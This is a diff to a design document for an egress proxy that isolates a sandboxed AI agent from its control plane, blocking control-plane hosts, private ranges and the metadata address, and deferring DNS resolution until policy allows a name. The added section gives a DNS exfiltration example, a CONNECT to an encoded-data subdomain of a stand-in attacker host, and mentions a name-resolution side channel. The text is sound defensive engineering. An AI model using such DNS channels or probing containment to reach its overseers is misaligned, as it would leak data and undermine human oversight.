@@ -1,7 +1,7 @@
 # Egress proxy — the relay guard, and the proxy's side of `/authorize`
 
-The two things the proxy decides for itself: which destinations it refuses before any
-policy is asked, and how it asks the control plane about everything else. Both are
+The two things the proxy decides for itself: which destinations it refuses whatever
+policy says, and how it asks the control plane about everything else. Both are
 `addon.py`, in this directory, and its tests, `tests/test_egress_addon.py` and
 `tests/test_egress_hooks.py`. What the proxy is to the rest of the system stays in the
 root, and this file does not repeat it:
@@ -16,7 +16,7 @@ root, and this file does not repeat it:
 - what the control plane does with the decisions this proxy takes alone, `DESIGN.md` →
   "Ingesting the decisions the proxy makes alone".
 
-## The relay guard — refused before policy is asked
+## The relay guard — refused whatever policy says
 
 **Control-plane relay guard (the proxy is the bridge, so the proxy must refuse
 it).** The egress proxy is one of two components attached to both `sandbox-net` and
@@ -24,17 +24,19 @@ a control network (`authorize-net` — see "The third net" in `DESIGN.md`; it is
 deliberately **not** on `control-net`). The other, the MCP gateway, carries no relay
 to turn (`tool-gateway/app.py`); this one does, so segmentation alone does **not**
 isolate the agent from the control plane — the proxy could in principle relay a
-connection onto that network. It therefore hard-refuses, **before** any policy /
-permanent-lifeline / port check, any destination that names a control-plane host (`control-plane`,
-`control-plane-ui`) or resolves into **any** control subnet — every network the
-control plane is homed on, not only the one this proxy can route to, because
-unroutability is a property of the compose file that the addon cannot verify. The
+connection onto that network. It therefore hard-refuses any destination that names
+a control-plane host (`control-plane`, `control-plane-ui`) or resolves into **any**
+control subnet — every network the control plane is homed on, not only the one this
+proxy can route to, because unroutability is a property of the compose file that the
+addon cannot verify. The name and literal-IP checks run **before** any policy /
+permanent-lifeline / port check; the resolve runs only once policy has allowed the
+name (below). The
 list is `FORBIDDEN_CIDRS_DEFAULT` in `proxies/egress/addon.py` and is deliberately
 not restated here; `tests/test_topology.py` holds it equal to the real subnets, and
-`_forbidden` is the check (`EGRESS_FORBIDDEN_HOSTS` / `EGRESS_FORBIDDEN_CIDRS`).
-Because the guard is checked first and never weighed against policy, no rule, human
-approval, or change to the port allowlist can widen it, and a public name whose DNS
-is pointed at a control subnet is caught by the resolve step. This makes the
+`_forbidden_reason` is the check (`EGRESS_FORBIDDEN_HOSTS` / `EGRESS_FORBIDDEN_CIDRS`).
+Because no outcome of policy overrides it, no rule, human approval, or change to the
+port allowlist can widen it, and a public name whose DNS is pointed at a control
+subnet is caught by the resolve step. This makes the
 CLAUDE.md invariant ("the agent must never reach the control plane") independently
 enforced at the one place segmentation cannot cover; `boundary-check.sh` asserts the
 proxy 403s a control-plane host and a literal IP in every control subnet, each in
@@ -52,7 +54,7 @@ localhost on Linux — loopback under another spelling), CGNAT/overlay
 (`100.64.0.0/10`), protocol-assignment and benchmarking (`192.0.0.0/24`,
 `198.18.0.0/15`), and multicast/reserved/broadcast (`224.0.0.0/4`, `240.0.0.0/4`),
 plus their IPv6 equivalents — via a
-separate `EGRESS_PRIVATE_CIDRS` set (`_forbidden`, checked before policy). The
+separate `EGRESS_PRIVATE_CIDRS` set (checked by the same two halves). The
 proxy's default route is egress-net, a masquerading bridge with a path to the
 cloud instance-metadata service (a credential-theft target), the Docker host, and
 the host's internal network; without a hard block, reaching those would rest
@@ -66,6 +68,21 @@ fail-closed startup assertion stays specifically about control-net. Override
 `EGRESS_PRIVATE_CIDRS` (narrow, don't empty) only for a deployment that
 legitimately proxies to a private target such as an internal package mirror.
 `boundary-check.sh` asserts the proxy 403s `169.254.169.254`.
+
+*Why the resolve waits for an allow.* A name is a channel. The proxy's resolver is
+recursive, so resolving a name the sandbox sent reaches the authoritative server of
+whoever owns the domain: `CONNECT <encoded-data>.attacker.example:443` carries data
+out in the query alone, whatever policy then says, and holding the name does not
+bound it, since every request would resolve before its own `/authorize`. So the
+resolve runs only for a name policy has allowed (`_forbidden_resolved`), and a held,
+refused or control-plane-down name never reaches DNS from the proxy: the hook refuses
+it before mitmproxy dials anything. The one failure Python raises before handing a
+name to the resolver, a name the `idna` codec cannot encode, is checked with the
+static half, so such a name never reaches policy. The cost: a name the proxy can
+resolve into a forbidden range, most often a sibling service such as `tool-gateway`
+sent on `:443`, is put to policy first and can raise a card that an allow will not
+make dialable; it used to be an instant 403. That instant 403 also told the agent
+which names resolve to internal addresses, and that signal is gone.
 
 *A destination, not a string — spelling normalization (fixed bug, keep the
 regression tests).* Both hard-blocked sets are lists of **IP ranges**, but what
